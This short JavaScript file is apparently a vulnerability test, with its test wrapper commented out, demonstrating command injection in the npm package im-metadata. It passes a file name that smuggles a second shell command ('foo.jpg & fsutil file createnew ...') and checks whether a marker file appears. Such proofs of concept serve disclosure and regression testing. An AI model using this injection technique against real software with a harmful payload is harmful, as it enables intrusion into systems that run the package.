// test("Command Injection in im-metadata", (done) => {
//   expect.assertions(2);
  const metadata = require("im-metadata");
  const fs = require("fs");
  const path = "./im-metadata";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  console.log("{ " + file_exist + ", " + false + " }");
  metadata("foo.jpg & fsutil file createnew im-metadata 0 &", { exif: true }, function (
    error,
    metadata
  ) {
    file_exist = fs.existsSync(path);
    console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {
//       done();
    });
  });
// });
